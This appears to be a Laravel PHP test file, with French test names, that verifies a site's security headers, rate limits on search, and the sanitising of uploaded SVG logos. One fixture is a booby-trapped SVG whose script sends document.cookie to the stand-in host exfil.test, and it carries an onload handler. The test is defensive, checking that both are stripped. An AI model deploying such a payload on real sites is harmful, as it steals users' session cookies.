<?php

namespace Tests\Feature;

use App\Models\SiteSetting;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\Concerns\ActsAsAdmin;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use ActsAsAdmin, RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        $this->seedAdmin();
    }

    // — En-têtes —

    public function test_les_en_tetes_de_securite_sont_poses(): void
    {
        $response = $this->get('/');

        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('X-Frame-Options', 'DENY');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        $this->assertStringContainsString('geolocation=()', $response->headers->get('Permissions-Policy'));
    }

    public function test_les_en_tetes_couvrent_aussi_le_back_office(): void
    {
        $this->actingAsAdmin()
            ->get(route('admin.dashboard', absolute: false))
            ->assertHeader('X-Frame-Options', 'DENY');
    }

    // — Limitation de débit —

    public function test_la_recherche_est_limitee_en_debit(): void
    {
        for ($i = 0; $i < 30; $i++) {
            $this->get('/recherche?q=test')->assertSuccessful();
        }

        $this->get('/recherche?q=test')->assertStatus(429);
    }

    public function test_l_api_de_recherche_est_limitee_en_debit(): void
    {
        for ($i = 0; $i < 60; $i++) {
            $this->get('/api/recherche?q=test')->assertSuccessful();
        }

        $this->get('/api/recherche?q=test')->assertStatus(429);
    }

    // — Téléversement du logo —

    public function test_un_svg_piege_est_assaini_avant_d_etre_stocke(): void
    {
        Storage::fake('public');

        $piege = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
            .'<script>fetch("https://exfil.test?c="+document.cookie)</script>'
            .'<rect onload="alert(1)" width="10" height="10"/></svg>';

        $this->actingAsAdmin()
            ->post(route('admin.settings.logo', absolute: false), [
                'logo' => UploadedFile::fake()->createWithContent('logo.svg', $piege),
            ])
            ->assertSessionHasNoErrors();

        $stored = Storage::disk('public')->get(SiteSetting::getLogo());

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onload', $stored);
        $this->assertStringNotContainsString('exfil.test', $stored);
        $this->assertStringContainsString('<rect', $stored, 'Le dessin légitime doit survivre.');
    }

    public function test_un_svg_illisible_est_refuse_et_rien_n_est_stocke(): void
    {
        Storage::fake('public');

        $this->actingAsAdmin()
            ->post(route('admin.settings.logo', absolute: false), [
                'logo' => UploadedFile::fake()->createWithContent('logo.svg', '<html>pas un svg</html>'),
            ])
            ->assertSessionHasErrors('logo');

        $this->assertNull(SiteSetting::getLogo());
    }

    public function test_un_type_de_fichier_non_autorise_est_refuse(): void
    {
        Storage::fake('public');

        $this->actingAsAdmin()
            ->post(route('admin.settings.logo', absolute: false), [
                'logo' => UploadedFile::fake()->create('charge.php', 4, 'application/x-php'),
            ])
            ->assertSessionHasErrors('logo');
    }
}
